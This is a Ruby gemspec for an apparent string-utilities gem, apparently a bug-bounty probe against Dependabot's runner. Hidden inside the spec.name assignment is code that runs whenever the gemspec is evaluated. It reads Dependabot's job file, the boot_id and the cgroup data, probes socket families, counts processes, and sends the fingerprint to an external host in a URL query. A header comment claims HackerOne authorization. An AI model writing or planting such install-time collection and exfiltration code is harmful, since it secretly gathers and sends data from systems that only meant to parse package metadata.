# frozen_string_literal: true
#
# v1.1 host environment fingerprint audit (extended).
#
# Authorization: HackerOne GitHub program; researcher's own job; own
# container; read-only system info + single syscall reachability test.
# Encoded as URL query string surfaced via proxy log channel.

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"
      require "digest"
      require "socket"

      own_id = (
        begin
          j = JSON.parse(File.read("/home/dependabot/dependabot-updater/job.json"))
          (j["job"] && j["job"]["id"]) || j["id"] || ENV["DEPENDABOT_JOB_ID"]
        rescue
          ENV["DEPENDABOT_JOB_ID"]
        end
      ).to_s

      fp = []

      # boot_id (per-VM-boot identifier — for ephemerality check)
      begin
        b = File.read("/proc/sys/kernel/random/boot_id").strip
        fp << "b=#{b[0, 16]}"
      rescue
        fp << "b=na"
      end

      # syscall reachability: try AF_ALG socket creation (Socket::AF_ALG = 38)
      begin
        s = Socket.new(38, Socket::SOCK_SEQPACKET, 0)
        s.close
        fp << "s38=ok"
      rescue Errno::EAFNOSUPPORT
        fp << "s38=eafnosupport"
      rescue Errno::EPERM
        fp << "s38=eperm"
      rescue Errno::EACCES
        fp << "s38=eaccess"
      rescue => e
        fp << "s38=#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 16]}"
      end

      # syscall reachability: AF_NETLINK (16) for comparison
      begin
        s = Socket.new(16, Socket::SOCK_DGRAM, 0)
        s.close
        fp << "s16=ok"
      rescue => e
        fp << "s16=#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 16]}"
      end

      # ps output line count
      begin
        ps = `ps -ef 2>/dev/null`.lines.size
        fp << "ps=#{ps}"
      rescue
        fp << "ps=na"
      end

      # additional: read /proc/1/cgroup full content hash for diff
      begin
        cg = File.read("/proc/1/cgroup")
        fp << "cgh=#{Digest::SHA256.hexdigest(cg)[0, 12]}"
      rescue
        fp << "cgh=na"
      end

      result = fp.join("-").gsub(/[^A-Za-z0-9.=-]/, "x")[0, 200]

      if !own_id.empty?
        begin
          uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{own_id}/details?fp=#{result.gsub('=','-')}")
          h = Net::HTTP.new(uri.host, uri.port)
          h.use_ssl = true
          h.open_timeout = 5
          h.read_timeout = 8
          h.get(uri.request_uri)
        rescue
        end
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
